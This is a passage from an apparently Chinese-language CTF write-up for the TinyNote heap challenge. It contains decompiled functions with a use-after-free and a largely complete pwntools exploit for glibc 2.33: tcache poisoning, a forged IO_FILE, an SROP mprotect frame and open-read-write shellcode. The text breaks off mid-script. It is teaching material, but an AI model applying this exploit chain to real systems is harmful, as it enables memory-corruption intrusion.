class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  LODWORD(v0) = sub_1465();</span><br><span class="line">  idx = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> *)sub_141E(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1240(<span class="string">"internal error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = chunk_buf;</span><br><span class="line">    chunk_buf[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>show没什么好说的，中规中矩的一个泄漏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_15B1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  LODWORD(v0) = sub_1465();</span><br><span class="line">  v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = chunk_buf[(<span class="keyword">signed</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1240(<span class="string">"Content:"</span>);</span><br><span class="line">      LODWORD(v0) = write(<span class="number">1</span>, chunk_buf[v2], <span class="number">0x10</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>存在uaf漏洞，free之后没有把指针清空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_1626</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = sub_1465();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_buf[v0] )</span><br><span class="line">      <span class="built_in">free</span>(chunk_buf[v0]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-利用分析"><a href="#2-2-利用分析" class="headerlink" title="2.2 利用分析"></a>2.2 利用分析</h3><ol><li>利用uaf首先把heap地址和libc地址泄漏出来</li><li>因为只能申请0x10大小的chunk，因此利用[fastbin_reverse_into_tcache](<a href="https://wood1314.github.io/year/09/15/ckw6j4s0s001n4r3fm19r0b5t/#more">house_of_botcake &amp;&amp; fastbin_reverse_into_tcache | 木头的小木屋 (wood1314.github.io)</a>)进行一个任意地址写堆地址。这个时候由于libc2-33的对齐保护，所以_IO_list_all是不能劫持的，stderr等也不能直接劫持，只能选择<code>_IO_2_1_stderr</code>的chain字段，利用我们tcache的key来劫持，正好可以劫持到heapbase+0x10的位置。这里不用fd字段劫持的原因是，fd字段会被抑或成一个很奇怪的字段，影响后续利用。</li><li>伪造IO_FILE结构，劫持控制流执行orw</li></ol><h3 id="2-3-利用过程"><a href="#2-3-利用过程" class="headerlink" title="2.3 利用过程"></a>2.3 利用过程</h3><h4 id="预备工作"><a href="#预备工作" class="headerlink" title="预备工作"></a>预备工作</h4><p>使用patch-elf修改题目libc为对应版本的glibc-all-in-one中的libc，方便带符号调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so ./TinyNote</span><br><span class="line"></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6 ./TinyNote</span><br></pre></td></tr></table></figure><h4 id="泄漏heap-地址和libc-地址"><a href="#泄漏heap-地址和libc-地址" class="headerlink" title="泄漏heap 地址和libc 地址"></a>泄漏heap 地址和libc 地址</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"># context.log_level = 'DEBUG'</span><br><span class="line">context.os = 'linux'</span><br><span class="line">context.arch = 'amd64'</span><br><span class="line">libc = ELF('/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6')</span><br><span class="line">sh = process('./TinyNote')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil('Choice:')</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Add</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Dlete</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line">Add(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success('heapbase: ' + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">0x31</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x330</span>)))</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x340</span>)))</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Show</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">sh.recvuntil(':')</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e0c00</span>  </span><br><span class="line"></span><br><span class="line">log.success('libc_base: ' + hex(libc_base))</span><br></pre></td></tr></table></figure><h4 id="构造fake-FILE"><a href="#构造fake-FILE" class="headerlink" title="构造fake_FILE"></a>构造fake_FILE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e2560</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">setcontext = libc_base + <span class="number">0x52970</span> + <span class="number">61</span></span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014a0a0</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x500</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x508</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable) </span><br><span class="line">payload = fake_IO_FILE + <span class="string">b'/bin/sh\x00'</span> + <span class="number">2</span>*p64(setcontext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span> + <span class="number">1</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x20</span> + <span class="number">0x10</span>*i)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>:(i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br></pre></td></tr></table></figure><h4 id="为后面的利用提前布置一些地址"><a href="#为后面的利用提前布置一些地址" class="headerlink" title="为后面的利用提前布置一些地址"></a>为后面的利用提前布置一些地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># put free_hook on tcache in 0x80 size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0xc0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((free_hook)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set tcache size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x101000000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write rdi address </span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x500</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(gadget) + p64(<span class="number">0x300</span> + heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set shellcode addr</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x520</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x900</span>))</span><br></pre></td></tr></table></figure><h4 id="设置SROP的frame以及shellcode"><a href="#设置SROP的frame以及shellcode" class="headerlink" title="设置SROP的frame以及shellcode"></a>设置SROP的frame以及shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set frame</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x528</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line">payload = bytes(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x300</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x320</span>)))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(setcontext))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # set shellcode in heap</span></span><br><span class="line">payload = bytes(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x900</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br></pre></td></tr></table></figure><h4 id="构造-fastbin-reverse-to-tcache"><a href="#构造-fastbin-reverse-to-tcache" class="headerlink" title="构造 fastbin_reverse_to_tcache"></a>构造 fastbin_reverse_to_tcache</h4><p>这里注意要把fastbin填为8个，这样的话就不会在reverse_into_tcache的时候引入别的chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #Create a fake fastbin chains</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span 